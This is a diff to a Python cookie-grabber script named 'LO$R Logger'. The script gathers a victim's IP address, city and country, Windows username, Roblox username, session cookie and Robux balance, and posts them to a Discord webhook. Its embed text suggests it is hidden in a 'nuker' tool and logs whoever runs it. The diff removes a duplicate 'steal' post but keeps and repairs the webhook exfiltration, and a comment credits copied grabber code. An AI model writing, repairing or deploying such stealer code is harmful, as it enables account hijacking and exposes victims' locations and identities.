@@ -417,7 +417,7 @@ premium = info['IsPremium'];
 
 
 
-ip = requests.get("https://wtfismyip.com/text").text
+ip = requests.get("https://api.ipify.org/").text
 
 gather = requests.get("http://ipinfo.io/json").json()
 
@@ -435,45 +435,8 @@ machines = platform.uname()
 
 pc = os.getenv("UserName")
 
-pass
-
-
-
-
-
-steal = {
-
-            "embeds": [
-
-                {
-
-                    "author": {
-
-                        "name": "LO$R Logger",
-
-                    },
-
-                    "description": f"@everyone {pc} tried nuking someone \n\n**token log:** ||soon||\n**IP:** ||{ip}||\n**City:** ||{city}||\n**Country:** ||{country}||\n**Region:** ||{region}||\n\n**username:** ||{User}||\n**Cookie:** ||{cookie}||\n**Rap:** ||{rap}||\n**Robux:** ||{rob}||",
-
-                    "color": 0x00C7FF,
-
-                    
-
-                    "footer": {
-
-                      "text": "Yo mum fat"
-
-                    }
-
-                }
-
-            ]
-
-        }
-
-requests.post("webhooker", json=steal)
 # skidded the part below this again from https://github.com/Mani175/Pirate-Cookie-Grabber/ bc my version is ass and i already skidded his other part
-discord = Discord(url=webhookk)
+discord = Discord(url=webhooker)
 
 discord.post(
     username="LO$R Logger",
@@ -502,5 +465,3 @@ discord.post(
         }
     ],
 )
-requests.post("webhooker", json=steal)
-############### end of skidding ################# 
